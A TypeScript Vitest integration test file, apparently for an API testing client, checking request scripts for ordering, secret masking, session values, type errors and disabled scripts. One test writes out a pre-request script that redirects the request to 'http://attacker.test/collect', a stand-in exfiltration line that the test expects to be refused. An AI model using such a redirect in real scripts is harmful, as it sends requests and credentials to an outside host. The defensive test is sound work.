// @vitest-environment node
/**
 * A request's scripts on main's send paths (#63), against a real server with the engine's own
 * sandbox and checker: the order (script, then auth), a secret a script never sees, the session
 * values a single send keeps and the next one reads, a value marked secret masked in the summary
 * and History, the refusals, and scripts switched off.
 */
import { mkdtemp, rm } from 'node:fs/promises';
import { createServer } from 'node:http';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';
import { startTestRestServer, type TestRestServer } from '@wirebench/engine/test-helpers';
import {
  createApi,
  createInterface,
  createProject,
  createRequest,
  createRestRequest,
  createSequence,
  createSequenceStep,
  entry,
} from '@wirebench/engine';
import type { Project, RequestScripts, RestRequestDef } from '@wirebench/engine';
import { EngineService } from '../src/main/engine-service.js';
import { HistoryService } from '../src/main/history-service.js';
import { registerHistoryChannels } from '../src/main/ipc/history.js';
import type { RequestChannelDeps } from '../src/main/ipc/request.js';
import { ScriptHost } from '../src/main/script-host.js';
import { SequenceRunner } from '../src/main/sequence-runner.js';
import { sendThroughEngine } from '../src/main/send/exchange.js';
import { sendDepsFor } from './helpers/send-deps.js';
import type { HistoryEntryWire, RestExchangeSummary } from '../src/shared/wire-types.js';

const handlers = new Map<string, (event: unknown, payload: unknown) => Promise<unknown>>();

vi.mock('electron', () => ({
  ipcMain: {
    handle: (name: string, handler: (event: unknown, payload: unknown) => Promise<unknown>) => {
      handlers.set(name, handler);
    },
  },
}));

const TOKEN = 'bearer-7c1e9d';
const API_KEY = 'header-key-51ab';
const LOGIN_TOKEN = 'session-token-3f9a2b';

let server: TestRestServer;
let host: ScriptHost;
let userDataDir: string;

beforeAll(async () => {
  server = await startTestRestServer();
});

afterAll(async () => {
  await server.close();
});

beforeEach(async () => {
  userDataDir = await mkdtemp(join(tmpdir(), 'wirebench-script-send-'));
});

afterEach(async () => {
  await host.dispose();
  await rm(userDataDir, { recursive: true, force: true });
});

function scripts(input: { pre?: string; post?: string; enabled?: boolean; secrets?: string[] }): RequestScripts {
  return {
    ...(input.pre !== undefined ? { pre: { text: input.pre } } : {}),
    ...(input.post !== undefined ? { post: { text: input.post } } : {}),
    api: 'wirebench',
    enabled: input.enabled ?? true,
    secrets: input.secrets ?? [],
  };
}

/** One API with a bearer token configured, holding the given requests. */
function project(requests: readonly RestRequestDef[]): Project {
  const api = createApi('Shop', {
    id: 'api-1',
    baseUrl: server.url,
    auth: { type: 'bearer', tokenRef: 'sec_token' },
    requests: [...requests],
  });
  return { ...createProject('Demo', { id: 'p1' }), apis: [api] };
}

interface Harness {
  readonly deps: RequestChannelDeps;
  readonly engine: EngineService;
  readonly history: HistoryEntryWire[];
  /** A single REST send of `requestId`, through the engine, with the same project and History. */
  readonly sendRest: (sendId: string, requestId: string) => Promise<RestExchangeSummary>;
}

async function harness(model: Project): Promise<Harness> {
  host = new ScriptHost({
    modelOf: () => model,
    openApiDocumentFor: () => Promise.reject(new Error('no definition')),
    grpcProtoSetFor: () => Promise.reject(new Error('no definition')),
    soapDefinitionFor: () => undefined,
  });
  const engine = new EngineService((ref) => Promise.resolve(ref === 'sec_token' ? TOKEN : undefined));
  const history = new HistoryService(userDataDir);
  await history.open('p1');
  const appended: HistoryEntryWire[] = [];
  // The project's own `region` property, which every send here expands against.
  const located = { ...model, properties: { ...model.properties, region: 'eu' } };
  const deps: RequestChannelDeps = {
    project: {
      projectId: () => 'p1',
      runContextFor: () => ({ project: located, projectDir: '/tmp/none' }),
      restMeta: () => undefined,
    } as unknown as RequestChannelDeps['project'],
    history,
    onHistoryAppended: (wire) => appended.push(wire),
    // The send's project's secrets: its token, and the credentials its auth names.
    secretsFor: () => (ref) =>
      Promise.resolve(ref === 'secret:api_key' ? API_KEY : ref === 'sec_token' ? TOKEN : undefined),
    scripts: host,
  };
  const restDeps = sendDepsFor(located, {
    history,
    onHistoryAppended: (wire) => appended.push(wire),
    // The send's project's secrets: its token, and the credentials its auth names.
    secretsFor: () => (ref) =>
      Promise.resolve(ref === 'secret:api_key' ? API_KEY : ref === 'sec_token' ? TOKEN : undefined),
    scripts: host,
  });
  const sendRest = (sendId: string, requestId: string): Promise<RestExchangeSummary> =>
    sendThroughEngine(restDeps, sendId, requestId, { draft: { kind: 'rest' } });
  return { deps, engine, history: appended, sendRest };
}

const echoed = (text: string): { headers: Record<string, string>; query: Record<string, string> } =>
  JSON.parse(text) as { headers: Record<string, string>; query: Record<string, string> };

describe('a REST send with scripts', () => {
  it('runs the pre-request script before auth, which it never sees', { timeout: 60_000 }, async () => {
    const request = {
      ...createRestRequest('Echo', { id: 'r1', url: '/echo', headers: [entry('x-api-key', '${secret:api_key}')] }),
      scripts: scripts({
        pre: [
          "request.headers.set('x-region', props.get('region') ?? 'none');",
          "log('auth header:', request.headers.get('authorization') ?? 'absent');",
          "log('key is a placeholder:', request.headers.get('x-api-key') !== 'header-key-51ab');",
        ].join('\n'),
        post: "test('echoed', () => expect(response.status).toBe(200));",
      }),
    };
    const { sendRest } = await harness(project([request]));

    const summary = await sendRest('s1', 'r1');

    const seen = echoed(summary.text);
    expect(seen.headers['x-region']).toBe('eu');
    expect(seen.headers['authorization']).toBe('Bearer <redacted>');
    // The secret the request's own text names goes out as its value, put back after the script.
    expect(seen.headers['x-api-key']).toBe(API_KEY);
    expect(summary.script?.log).toEqual(['auth header: absent', 'key is a placeholder: true']);
    expect(summary.script?.tests).toEqual([{ name: 'echoed', passed: true }]);
  });

  it(
    'keeps a secret value in the session, masked everywhere, for the next single send',
    { timeout: 60_000 },
    async () => {
      const login = {
        ...createRestRequest('Log in', { id: 'r1', url: '/echo', query: [entry('t', LOGIN_TOKEN)] }),
        scripts: scripts({
          post: [
            'const body = response.json() as { query: Record<string, string> };',
            "vars.set('token', body.query['t'] ?? '', { secret: true });",
            "vars.set('plain', 'visible');",
            "log('got', body.query['t']);",
          ].join('\n'),
        }),
      };
      const next = createRestRequest('Cart', {
        id: 'r2',
        url: '/echo',
        headers: [entry('x-session', '${#Sequence#token}'), entry('x-plain', '${#Sequence#plain}')],
      });
      const { sendRest, history } = await harness(project([login, next]));

      const first = await sendRest('s1', 'r1');
      expect(first.script?.log.join('\n')).not.toContain(LOGIN_TOKEN);
      expect(JSON.stringify(history[0])).not.toContain(LOGIN_TOKEN);
      expect(host.sessionValues('p1')).toEqual({ token: LOGIN_TOKEN, plain: 'visible' });
      expect(host.listValues('p1')).toEqual([
        { name: 'token', secret: true },
        { name: 'plain', value: 'visible', secret: false },
      ]);

      const second = await sendRest('s2', 'r2');
      // The server got the token; the request as the summary and History show it has it masked.
      expect(echoed(second.text).headers['x-session']).toBe('<redacted>');
      expect(echoed(second.text).headers['x-plain']).toBe('visible');
      expect(JSON.stringify(second.http.request)).not.toContain(LOGIN_TOKEN);
      expect(JSON.stringify(history[1])).not.toContain(LOGIN_TOKEN);
      expect(second.script).toBeUndefined();

      expect(host.clearValues('p1')).toBe(2);
      expect(host.sessionValues('p1')).toEqual({});
    },
  );

  it(
    'refuses a pre-request script that sends the request elsewhere, before anything is sent',
    { timeout: 60_000 },
    async () => {
      const request = {
        ...createRestRequest('Echo', { id: 'r1', url: '/echo' }),
        scripts: scripts({ pre: "request.url = 'http://attacker.test/collect';" }),
      };
      const { sendRest, history } = await harness(project([request]));

      await expect(sendRest('s1', 'r1')).rejects.toMatchObject({
        code: 'script-origin-change',
      });
      expect(history).toEqual([]);
    },
  );

  it('refuses a script that does not type-check, naming the file', { timeout: 60_000 }, async () => {
    const request = {
      ...createRestRequest('Echo', { id: 'r1', url: '/echo' }),
      scripts: scripts({ post: 'log(response.statuss);' }),
    };
    const { sendRest } = await harness(project([request]));

    const error = await sendRest('s1', 'r1').then(
      () => undefined,
      (thrown: unknown) => thrown as { code: string; message: string },
    );
    expect(error?.code).toBe('script-type-error');
    expect(error?.message).toContain('Echo.post.ts:1:');
  });

  it('sends a request whose scripts are off without running them, and says so', { timeout: 60_000 }, async () => {
    const request = {
      ...createRestRequest('Echo', { id: 'r1', url: '/echo' }),
      scripts: scripts({ pre: "request.headers.set('x-ran', 'yes');", enabled: false }),
    };
    const { sendRest } = await harness(project([request]));

    const summary = await sendRest('s1', 'r1');
    expect(echoed(summary.text).headers['x-ran']).toBeUndefined();
    expect(summary.scriptsOff).toBe(true);
    expect(summary.script).toBeUndefined();
  });
});

describe('a SOAP send with scripts', () => {
  it(
    'runs the pre-request script on the expanded envelope, before Basic auth is applied',
    { timeout: 60_000 },
    async () => {
      const seen: { headers: Record<string, string | string[] | undefined>; body: string }[] = [];
      const soap = createServer((req, res) => {
        const chunks: Buffer[] = [];
        req.on('data', (chunk: Buffer) => chunks.push(chunk));
        req.on('end', () => {
          seen.push({ headers: req.headers, body: Buffer.concat(chunks).toString('utf8') });
          res.writeHead(200, { 'content-type': 'text/xml' });
          res.end(
            '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><ok/></s:Body></s:Envelope>',
          );
        });
      });
      await new Promise<void>((resolve) => soap.listen(0, '127.0.0.1', resolve));
      const endpoint = `http://127.0.0.1:${String((soap.address() as AddressInfo).port)}/soap`;
      try {
        const iface = createInterface('Calc', {
          id: 'iface-1',
          definitionUrl: 'http://example.test/calc.wsdl',
          operations: [
            {
              name: 'Add',
              bindingName: '{urn:calc}CalcSoap',
              slug: 'Add',
              order: 0,
              requests: [
                {
                  ...createRequest('Add', {
                    id: 'soap-1',
                    envelopeXml: '<e/>',
                    soapVersion: '1.1',
                    properties: { timeoutMs: 5_000 },
                  }),
                  endpointUrl: endpoint,
                  auth: { type: 'basic', username: 'svc', passwordRef: 'sec_pw', preemptive: true },
                  scripts: scripts({
                    pre: [
                      "request.headers.set('x-trace', 'from-script');",
                      "request.envelope = request.envelope.replace('<v>1</v>', '<v>2</v>');",
                      "log('auth:', request.headers.get('authorization') ?? 'absent');",
                      "log('key hidden:', !request.envelope.includes('header-key-51ab'));",
                    ].join('\n'),
                    post: "test('answered', () => expect(response.status).toBe(200));",
                  }),
                },
              ],
            },
          ],
        });
        const model: Project = { ...createProject('Demo', { id: 'p1' }), properties: { v: '1' }, interfaces: [iface] };
        await harness(model);
        const deps = sendDepsFor(model, {
          // The project's token, and the password its Basic auth names.
          secretsFor: () => (ref) =>
            Promise.resolve(ref === 'secret:api_key' ? API_KEY : ref === 'sec_pw' ? 'pw-9d2' : undefined),
          scripts: host,
        });

        // The editor's envelope, unsaved, rides over the saved `<e/>`.
        const summary = await sendThroughEngine(deps, 'soap-send', 'soap-1', {
          draft: {
            kind: 'soap',
            override: {
              endpoint,
              envelopeXml: '<Envelope><Body><v>${v}</v><k>${secret:api_key}</k></Body></Envelope>',
            },
          },
        });

        expect(seen).toHaveLength(1);
        expect(seen[0]?.headers['x-trace']).toBe('from-script');
        expect(seen[0]?.headers.authorization).toBe(`Basic ${Buffer.from('svc:pw-9d2').toString('base64')}`);
        expect(seen[0]?.body).toBe(`<Envelope><Body><v>2</v><k>${API_KEY}</k></Body></Envelope>`);
        expect(summary.script?.log).toEqual(['auth: absent', 'key hidden: true']);
        expect(summary.script?.tests).toEqual([{ name: 'answered', passed: true }]);
      } finally {
        await new Promise((resolve) => soap.close(resolve));
      }
    },
  );
});

describe('a sequence step with scripts', () => {
  it("hands its values to the run, not to the project's session", { timeout: 60_000 }, async () => {
    const login = {
      ...createRestRequest('Log in', { id: 'r1', url: '/echo', query: [entry('t', LOGIN_TOKEN)] }),
      scripts: scripts({
        post: [
          'const body = response.json() as { query: Record<string, string> };',
          "vars.set('token', body.query['t'] ?? '', { secret: true });",
          "log('got', body.query['t']);",
        ].join('\n'),
      }),
    };
    const cart = {
      ...createRestRequest('Cart', { id: 'r2', url: '/echo', headers: [entry('x-session', '${#Sequence#token}')] }),
      scripts: scripts({
        post: [
          'const body = response.json() as { headers: Record<string, string> };',
          "test('the token arrived', () => expect(body.headers['x-session']).toBe(vars.get('token') ?? ''));",
        ].join('\n'),
      }),
    };
    const model: Project = {
      ...project([login, cart]),
      sequences: [
        createSequence('Checkout', {
          id: 'S1',
          steps: [createSequenceStep('r1', { id: 'T1' }), createSequenceStep('r2', { id: 'T2' })],
        }),
      ],
    };
    const { deps, engine } = await harness(model);

    const result = await new SequenceRunner().run(
      { sequenceId: 'S1', runId: 'R1' },
      { service: engine, requests: deps, modelOf: () => model, emit: () => undefined },
    );

    expect(result.steps.map((step) => step.error)).toEqual([undefined, undefined]);
    expect(result.outcome).toBe('passed');
    expect(result.steps[1]?.assertions).toEqual([{ type: 'script', label: 'the token arrived', outcome: 'passed' }]);
    expect(result.steps[0]?.scriptLog).toHaveLength(1);
    expect(JSON.stringify(result)).not.toContain(LOGIN_TOKEN);
    expect(host.sessionValues('p1')).toEqual({});
  });
});

describe('a SOAP resend from History', () => {
  /** A SOAP server that answers every POST; `soap-1` is sent to it with the given scripts. */
  async function resendOf(requestScripts: RequestScripts): Promise<{ reply: unknown; seen: string[] }> {
    const seen: string[] = [];
    const soap = createServer((req, res) => {
      seen.push(String(req.headers['x-trace'] ?? ''));
      req.resume();
      req.on('end', () => {
        res.writeHead(200, { 'content-type': 'text/xml' });
        res.end('<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><ok/></s:Body></s:Envelope>');
      });
    });
    await new Promise<void>((resolve) => soap.listen(0, '127.0.0.1', resolve));
    try {
      const iface = createInterface('Calc', {
        id: 'iface-1',
        definitionUrl: 'http://example.test/calc.wsdl',
        operations: [
          {
            name: 'Add',
            bindingName: '{urn:calc}CalcSoap',
            slug: 'Add',
            order: 0,
            requests: [
              {
                ...createRequest('Add', { id: 'soap-1', envelopeXml: '<e/>', soapVersion: '1.1' }),
                endpointUrl: `http://127.0.0.1:${String((soap.address() as AddressInfo).port)}/soap`,
                scripts: requestScripts,
              },
            ],
          },
        ],
      });
      const model: Project = { ...createProject('Demo', { id: 'p1' }), interfaces: [iface] };
      await harness(model);
      const entry = {
        id: 'h-1',
        at: '2026-01-01T00:00:00.000Z',
        projectId: 'p1',
        requestId: 'soap-1',
        requestName: 'Add',
        interfaceName: 'Calc',
        operationName: 'Add',
        endpoint: 'http://old.test/soap',
        soapVersion: '1.1',
        durationMs: 1,
        ok: true,
        request: { envelopeXml: '<e/>', headers: [] },
        sizeBytes: 1,
      } satisfies HistoryEntryWire;
      handlers.clear();
      registerHistoryChannels(
        { get: (id: string) => (id === 'h-1' ? entry : undefined) } as unknown as HistoryService,
        {
          project: {
            projectId: () => 'p1',
            endpointFor: () => 'http://h/s',
          },
          send: sendDepsFor(model, { scripts: host }),
        },
      );
      const reply = await handlers.get('history.resend')!({ sender: {} }, { id: 'h-1' });
      return { reply, seen };
    } finally {
      await new Promise((resolve) => soap.close(resolve));
    }
  }

  it("runs the saved request's scripts, as its send from the editor does", { timeout: 60_000 }, async () => {
    const { reply, seen } = await resendOf(
      scripts({
        pre: "request.headers.set('x-trace', 'from-script');",
        post: "test('answered', () => expect(response.status).toBe(200));",
      }),
    );
    expect(reply).toMatchObject({ ok: true, value: { script: { tests: [{ name: 'answered', passed: true }] } } });
    expect(seen).toEqual(['from-script']);
  });

  it('says its scripts are off when they are, running none', { timeout: 60_000 }, async () => {
    const { reply, seen } = await resendOf(
      scripts({ pre: "request.headers.set('x-trace', 'from-script');", enabled: false }),
    );
    expect(reply).toMatchObject({ ok: true, value: { scriptsOff: true } });
    expect(seen).toEqual(['']);
  });
});
